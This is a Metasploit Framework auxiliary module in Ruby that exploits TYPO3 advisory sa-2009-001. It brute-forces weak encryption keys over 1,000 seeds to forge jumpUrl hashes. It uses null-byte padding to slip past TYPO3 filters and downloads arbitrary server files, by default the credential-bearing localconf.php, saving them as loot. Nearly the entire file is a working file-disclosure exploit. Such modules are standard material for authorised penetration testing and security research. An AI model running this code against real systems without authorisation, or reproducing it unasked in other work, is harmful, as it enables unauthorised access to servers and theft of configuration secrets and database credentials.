##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'           => 'TYPO3 sa-2009-001 Weak Encryption Key File Disclosure',
			'Description'    => %q{
				This module exploits a flaw in TYPO3 encryption ey creation process to allow for
				file disclosure in the jumpUrl mechanism. This flaw can be used to read any file
				that the web server user account has access to view.
			},
			'References'     =>
				[
					['OSVDB', '51536'],
					['URL', 'http://blog.c22.cc/advisories/typo3-sa-2009-001'],
					['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-001/'],
				],
			'DisclosureDate' => 'Jan 20 2009',
			'Author'         => [ 'Chris John Riley' ],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('URI', [true, "TYPO3 Path", "/"]),
				OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
				OptString.new('ENC_KEY', [false, "Encryption key if known", '']),
			], self.class)
	end

	def enc_key(seed)

		if datastore['ENC_KEY'] != ''
			final = datastore['ENC_KEY']
			print_status("Using provided Encryption Key")
		else
			# build the encrption key to check
			seed = seed.to_s()
			rnd1 = Digest::MD5.hexdigest(seed)
			rnd2 = Digest::MD5.hexdigest(rnd1)
			rnd3 = Digest::MD5.hexdigest(rnd1 + rnd2)
			final = rnd1 + rnd2 + rnd3
		end

		return final
	end

	def run

	# Add padding to bypass TYPO3 security filters
	#
	# Null byte fixed in PHP 5.3.4
	#

    uri = normalize_uri(datastore['URI'])
	case datastore['RFILE']
	when nil
		# Nothing
	when /localconf\.php$/i
		jumpurl = "#{datastore['RFILE']}%00/."
		jumpurl_len = (jumpurl.length) -2 #Account for difference in length with null byte
		jumpurl_enc = jumpurl.sub("%00", "\00") #Replace %00 with \00 to correct null byte format
		print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
	when /^\.\.(\/|\\)/i
		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
	else
		jumpurl_len = (datastore['RFILE'].length)
		jumpurl = "#{datastore['RFILE']}"
		jumpurl_enc = "#{datastore['RFILE']}"
	end

	print_status("Establishing a connection to #{rhost}:#{rport}")
	print_status("Trying to retrieve #{datastore['RFILE']}")
	print_status("Rotating through possible weak encryption keys")

	for i in (0..1000)

		final = enc_key(i)

		locationData = Rex::Text::rand_text_numeric(1) +'::'+ Rex::Text::rand_text_numeric(2)
		juarray = "a:3:{i:0;s:#{jumpurl_len.to_s()}:\"#{jumpurl_enc}\""
		juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\""
		juarray << ";i:2;s:#{final.length}:\"#{final}\";}"

		juhash = Digest::MD5.hexdigest(juarray)
		juhash = juhash[0..9] # shortMD5 value for use as juhash

		uri_base_path = normalize_uri(uri, '/index.php')

		file_uri = "#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
		vprint_status("Checking Encryption Key [#{i}/1000]: #{final}")

		begin
			file = send_request_raw({
			'uri'       => file_uri,
			'method'    => 'GET',
			'headers'   =>
				{
					'Connection' => 'Close',
				}
			},25)

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE => e
			print_error(e.message)
		end

		case file.headers['Content-Type']
		when 'text/html'
			case file.body
			when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
				print_error("File #{datastore['RFILE']} does not exist.")
				print_good("Discovered encryption key : #{final}")
				return
			when 'jumpurl Secure: locationData, ' + locationData + ', was not accessible.'
				print_error("File #{datastore['RFILE']} is not accessible.")
				print_good("Discovered encryption key : #{final}")
				return
			when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
				print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
				print_good("Discovered encryption key : #{final}")
				return
			end
		when 'application/octet-stream'
			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
			print_good("Discovered encryption key : #{final}")
			print_good("Writing local file " + File.basename(datastore['RFILE'].downcase) + " to loot")
			store_loot("typo3_" + File.basename(datastore['RFILE'].downcase), "text/xml", addr, file.body, "typo3_" + File.basename(datastore['RFILE'].downcase), "Typo3_sa_2009_001")
			return
		else
			if datastore['ENC_KEY'] != ''
				print_error("Encryption Key specified is not correct")
				return
			else
				# Try next encryption key
			end
		end
	end

		print_error("#{rhost}:#{rport} [Typo3-SA-2009-001] Failed to retrieve file #{datastore['RFILE']}")

	end

end
